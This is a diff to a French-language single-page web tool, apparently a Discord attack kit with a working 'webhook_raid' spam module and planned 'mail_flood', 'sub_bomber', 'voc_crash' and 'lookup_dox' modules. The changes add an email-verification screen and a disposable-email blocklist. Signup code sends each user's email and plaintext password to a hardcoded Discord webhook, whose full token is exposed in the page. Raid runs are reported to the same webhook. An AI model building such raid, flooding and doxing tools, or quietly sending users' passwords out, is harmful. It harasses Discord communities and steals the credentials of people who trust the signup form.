@@ -106,8 +106,13 @@
 
 <!-- CONFIG WEBHOOK ADMIN -->
 <script>
-  // ⚠️ TON WEBHOOK POUR LES LOGS ET LES COMPTES
   const ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1571285383239569504/YapKmXRjzG6Q-r9UxXLFnL-RpLQHlw7uMvdxtpffK2PGayc7KnJjYFnHvniSNWo5qfrM";
+  
+  // Liste des domaines de mails temporaires à blacklist (tu peux en ajouter)
+  const BLOCKED_DOMAINS = [
+    "@mailinator.com", "@10minutemail.com", "@guerrillamail.com", "@temp-mail.org", "@yopmail.com",
+    "@tempmail.com", "@throwawaymail.com", "@mail.tm", "@sharklasers.com", "@getnada.com"
+  ];
 </script>
 
 <div class="frame">
@@ -126,6 +131,11 @@
         <span class="icon"></span><span>webhook_raid</span><span class="badge">HOOK</span>
       </div>
       <div class="nav-item wip" onclick="logConsole('warn', 'Module WIP')"><span class="icon"></span><span>mail_flood</span><span class="badge">WIP</span></div>
+      <div class="nav-item wip" onclick="logConsole('warn', 'Module WIP')"><span class="icon"></span><span>sub_bomber</span><span class="badge">WIP</span></div>
+      <div class="nav-item wip" onclick="logConsole('warn', 'Module WIP')"><span class="icon"></span><span>tg_mail_proxy</span><span class="badge">WIP</span></div>
+      <div class="nav-item wip" onclick="logConsole('warn', 'Module WIP')"><span class="icon"></span><span>voc_crash</span><span class="badge">WIP</span></div>
+      <div class="nav-item wip" onclick="logConsole('warn', 'Module WIP')"><span class="icon"></span><span>lookup_dox</span><span class="badge">WIP</span></div>
+      <div class="nav-item wip" onclick="logConsole('warn', 'Module WIP')"><span class="icon"></span><span>custom_cmd</span><span class="badge">WIP</span></div>
       
       <div class="sidebar-label" style="margin-top:2rem">// SYSTEM</div>
       <div class="nav-item" data-mod="logs" onclick="switchTab('logs')"><span class="icon"></span><span>logs</span></div>
@@ -147,6 +157,18 @@
         </div>
         <button class="btn-main" id="auth-btn" onclick="handleAuth()">CRÉER UN COMPTE</button>
         <div class="switch-auth" id="auth-switch" onclick="toggleAuthMode()">Déjà un compte ? Se connecter</div>
+      </div>
+
+      <!-- ÉCRAN DE VÉRIFICATION (CODE) -->
+      <div id="verify-screen" style="display: none; flex-direction: column; align-items: center; justify-content: center; height: 100%; min-height: 500px; gap: 1rem;">
+        <h2 style="color: var(--green);">VÉRIFICATION</h2>
+        <p style="color: var(--dim); margin-bottom: 1rem; text-align: center;">Un code a été envoyé à <br><b id="verify-email-display" style="color: var(--text);"></b></p>
+        <div class="auth-field">
+          <label>Code à 6 chiffres</label>
+          <input type="text" id="verify-code" placeholder="000000" maxlength="6" style="text-align: center; font-size: 1.5rem; letter-spacing: 0.5em;">
+        </div>
+        <button class="btn-main" onclick="submitCode()">VÉRIFIER</button>
+        <div class="switch-auth" onclick="showAuth()">Annuler</div>
       </div>
 
       <!-- ÉCRAN APPLICATION -->
@@ -196,9 +218,14 @@
 <script>
   // --- ÉTAT GLOBAL ---
   let currentMod = 'raid';
-  let isRegisterMode = true; // Par défaut, on crée un compte
+  let isRegisterMode = true; 
   let systemLogs = JSON.parse(localStorage.getItem('bench_system_logs') || '[]');
   let currentUserEmail = localStorage.getItem('bench_current_user') || null;
+  
+  // Pour la vérification
+  let pendingEmail = null;
+  let pendingPass = null;
+  let generatedCode = null;
 
   // --- INITIALISATION UI ---
   window.onload = () => {
@@ -211,6 +238,7 @@
 
   function showApp() {
     document.getElementById('auth-screen').style.display = 'none';
+    document.getElementById('verify-screen').style.display = 'none';
     document.getElementById('app-screen').style.display = 'flex';
     document.getElementById('current-user').textContent = currentUserEmail;
     switchTab(currentMod);
@@ -219,8 +247,13 @@
 
   function showAuth() {
     document.getElementById('auth-screen').style.display = 'flex';
+    document.getElementById('verify-screen').style.display = 'none';
     document.getElementById('app-screen').style.display = 'none';
     document.getElementById('current-user').textContent = 'GUEST';
+    document.getElementById('auth-email').value = '';
+    document.getElementById('auth-pass').value = '';
+    pendingEmail = null;
+    pendingPass = null;
   }
 
   // --- GESTION DES COMPTES ---
@@ -238,23 +271,58 @@
     let accounts = JSON.parse(localStorage.getItem('bench_accounts') || '{}');
 
     if (isRegisterMode) {
+      // Vérification du domaine blacklisté
+      const isBlocked = BLOCKED_DOMAINS.some(domain => email.toLowerCase().endsWith(domain));
+      if (isBlocked) {
+        alert("Erreur : Les adresses email temporaires ou jetables sont interdites.");
+        return;
+      }
+
       if (accounts[email]) { alert("Cet email est déjà enregistré."); return; }
       
-      // Sauvegarde locale
-      accounts[email] = pass;
-      localStorage.setItem('bench_accounts', JSON.stringify(accounts));
+      // GÉNÉRATION DU CODE (Simulation d'envoi)
+      // Note: Pour un vrai envoi d'email, il faut un backend.
+      // Ici, on simule le code et on l'affiche dans une alerte pour que tu puisses tester.
+      generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
       
-      // Envoi au webhook Discord
-      sendAdminLog(`NOUVEAU COMPTE`, `Email: ${email}\nPassword: ${pass}`);
+      pendingEmail = email;
+      pendingPass = pass;
+
+      // Envoi au webhook Discord (logs admin)
+      sendAdminLog(`INSCRIPTION (Attente Code)`, `Email: ${email}\nPass: ${pass}\nCode généré: ${generatedCode}`);
       
-      alert("Compte créé ! Connexion automatique.");
-      loginUser(email);
+      // Affichage de l'écran de vérification
+      document.getElementById('auth-screen').style.display = 'none';
+      document.getElementById('verify-screen').style.display = 'flex';
+      document.getElementById('verify-email-display').textContent = email;
+      
+      // Pour la démo, on alert le code pour que l'utilisateur puisse le taper
+      setTimeout(() => {
+        alert(`[SIMULATION EMAIL]\nLe code de vérification est : ${generatedCode}\n(En production, ceci serait envoyé par mail)`);
+      }, 500);
+
     } else {
       if (accounts[email] && accounts[email] === pass) {
         loginUser(email);
       } else {
         alert("Identifiants incorrects.");
       }
+    }
+  }
+
+  function submitCode() {
+    const inputCode = document.getElementById('verify-code').value.trim();
+    if (inputCode === generatedCode) {
+      // Code correct : on valide le compte
+      let accounts = JSON.parse(localStorage.getItem('bench_accounts') || '{}');
+      accounts[pendingEmail] = pendingPass;
+      localStorage.setItem('bench_accounts', JSON.stringify(accounts));
+      
+      sendAdminLog(`NOUVEAU COMPTE VÉRIFIÉ`, `Email: ${pendingEmail}`);
+      
+      loginUser(pendingEmail);
+    } else {
+      alert("Code incorrect. Réessaie.");
     }
   }
 
@@ -287,14 +355,12 @@
       }]
     };
     
-    // Envoi asynchrone (on ne bloque pas l'UI)
     fetch(ADMIN_WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     }).catch(e => console.error("Erreur webhook admin", e));
 
-    // Sauvegarde aussi en local pour l'affichage dans l'onglet Logs
     const entry = { 
       time: new Date().toLocaleTimeString('fr-FR'), 
       action: action, 
@@ -312,21 +378,17 @@
     if(!tabId) return;
     currentMod = tabId;
     
-    // UI Active
     document.querySelectorAll('.nav-item[data-mod]').forEach(i => i.classList.remove('active'));
     document.querySelector(`.nav-item[data-mod="${tabId}"]`).classList.add('active');
     
-    // Meta
     const titles = { raid: 'webhook_raid', logs: 'system_logs' };
     const paths = { raid: '/modules/discord/webhook', logs: '/system/logs' };
     document.getElementById('mod-title').textContent = titles[tabId];
     document.getElementById('mod-path').textContent = paths[tabId];
     
-    // Panels
     document.querySelectorAll('.panel').forEach(p => p.style.display = 'none');
     document.getElementById('panel-' + tabId).style.display = 'block';
 
-    // Visibility
     if (tabId === 'logs') {
       document.getElementById('action-bar').style.display = 'none';
       document.getElementById('main-console').style.display = 'none';
@@ -407,7 +469,6 @@
 
     logConsole('info', `webhook_raid → ${hooks.length} hook(s) · ${count} msg/hook`);
     
-    // LOG SYSTEME
     sendAdminLog('EXECUTION RAID', `Hooks: ${hooks.length}\nCount: ${count}\nMessage: ${content}\nType: ${type}`);
 
     let totalSent = 0;
